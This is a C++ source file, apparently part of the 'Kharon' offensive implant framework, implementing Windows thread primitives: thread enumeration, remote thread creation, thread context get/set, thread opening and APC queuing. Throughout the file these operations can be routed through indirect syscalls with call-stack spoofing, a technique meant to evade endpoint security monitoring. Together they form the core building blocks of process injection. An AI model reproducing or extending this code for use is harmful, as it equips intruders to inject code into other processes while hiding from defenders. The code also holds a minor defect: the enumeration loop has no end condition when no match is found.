#include <Kharon.h>

auto DECLFN Thread::Enum(
    _In_      Action::Thread Type,
    _In_opt_  ULONG ProcessID,
    _In_opt_  ULONG Flags,
    _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
) -> ULONG {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
    PVOID                       ValToFree     = NULL;
    ULONG                       bkErrorCode   =  0;
    ULONG                       ReturnLen     = 0;
    ULONG                       RandomNumber  = 0;
    ULONG                       ThreadID      = 0;
    BOOL                        bkSuccess     = FALSE;

    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
    if ( ! ReturnLen ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)hAlloc( ReturnLen );
    ValToFree   = SysProcInfo;

    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
    if ( bkErrorCode ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

    while( 1 ) {
        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
            SysThreadInfo = SysProcInfo->Threads;

            for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( Type == Action::Thread::Random ) {
                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                        ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                    }
                }
            }
        }

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

_KH_END:
    if ( SysProcInfo ) hFree( ValToFree );

    return ThreadID;
}

auto DECLFN Thread::Create(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  StartAddress,
    _In_  PVOID  Parameter,
    _In_  ULONG  StackSize,
    _In_  ULONG  uFlags,
    _Out_ ULONG* ThreadID,
    _In_  LPSECURITY_ATTRIBUTES Attributes
) -> HANDLE {
    const UINT32 Flags = Self->Config.Syscall;
    HANDLE   Handle = nullptr;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( ! Flags ) {
        if ( ProcessHandle ) {
            return Self->Krnl32.CreateRemoteThread(
                ProcessHandle, Attributes, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, uFlags, ThreadID
            );
        }

        return Self->Krnl32.CreateThread(
            Attributes, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, uFlags, ThreadID
        );
    }

    UPTR Address = SYS_ADDR( Sys::CrThread );
    UPTR ssn     = SYS_SSN( Sys::CrThread );

    ULONG CreateFlags = 0;
    if ( uFlags & CREATE_SUSPENDED) CreateFlags |= 0x00000001; 
    
    Status = (NTSTATUS)Self->Spf->Call(
        Address, ssn, (UPTR)&Handle, (UPTR)THREAD_ALL_ACCESS,
        (UPTR)nullptr, (UPTR)ProcessHandle, (UPTR)StartAddress,
        (UPTR)Parameter, (UPTR)uFlags, (UPTR)0,
        (UPTR)StackSize, (UPTR)0, (UPTR)nullptr
    );

    if ( NT_SUCCESS( Status ) ) {
        if ( ThreadID ) {
            *ThreadID = Self->Krnl32.GetThreadId( Handle );
        }
        return Handle;
    }

    return INVALID_HANDLE_VALUE;
}

auto DECLFN Thread::SetCtx(
    _In_ HANDLE   Handle,
    _In_ CONTEXT* Ctx
) -> BOOL {
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! Flags ) return NT_SUCCESS( Self->Ntdll.NtSetContextThread( Handle, Ctx ) );

    UPTR Address = SYS_ADDR( Sys::SetCtxThrd );
    UPTR ssn = SYS_SSN( Sys::SetCtxThrd );

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Ctx
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Thread::GetCtx(
    _In_  HANDLE   Handle,
    _Out_ CONTEXT* Ctx
) -> BOOL {
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! Flags ) return NT_SUCCESS( Self->Ntdll.NtGetContextThread( Handle, Ctx ) );

    UPTR Address = SYS_ADDR( Sys::GetCtxThrd );
    UPTR ssn     = SYS_SSN( Sys::GetCtxThrd );

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Ctx
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Thread::Open(
    _In_ ULONG RightAccess,
    _In_ BOOL  Inherit,
    _In_ ULONG ThreadID
) -> HANDLE {
    const UINT32 Flags = Self->Config.Syscall;
    
    OBJECT_ATTRIBUTES ObjAttr  = { sizeof(ObjAttr) };
    CLIENT_ID         ClientId = { 0, UlongToHandle( ThreadID ) };
    LONG              Status   = STATUS_UNSUCCESSFUL;
    HANDLE            Result   = nullptr;

    if ( ! Flags ) {
        return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
    }

    UPTR Address = SYS_ADDR( Sys::OpenThrd );
    UPTR ssn = SYS_SSN( Sys::OpenThrd );

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)&Result, RightAccess, (UPTR)&ObjAttr, (UPTR)&ClientId
    );

    Self->Usf->NtStatusToError( Status );
        
    return Result;
}

auto DECLFN Thread::QueueAPC(
    _In_     PVOID  CallbackFnc,
    _In_     HANDLE ThreadHandle,
    _In_opt_ PVOID  Argument1,
    _In_opt_ PVOID  Argument2,
    _In_opt_ PVOID  Argument3
) -> LONG {
    const UINT32 Flags  = Self->Config.Syscall;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! Flags ) {
        return Self->Ntdll.NtQueueApcThread(
            ThreadHandle, (PPS_APC_ROUTINE)CallbackFnc,
            Argument1, Argument2, Argument3
        );
    }

    UPTR Address = SYS_ADDR( Sys::QueueApc );
    UPTR ssn = SYS_SSN( Sys::QueueApc );

    Status = (NTSTATUS)Self->Spf->Call(
        Address, ssn, (UPTR)ThreadHandle,
        (UPTR)CallbackFnc, (UPTR)Argument1,
        (UPTR)Argument2, (UPTR)Argument3
    );

    Self->Usf->NtStatusToError( Status );

    return Status;
}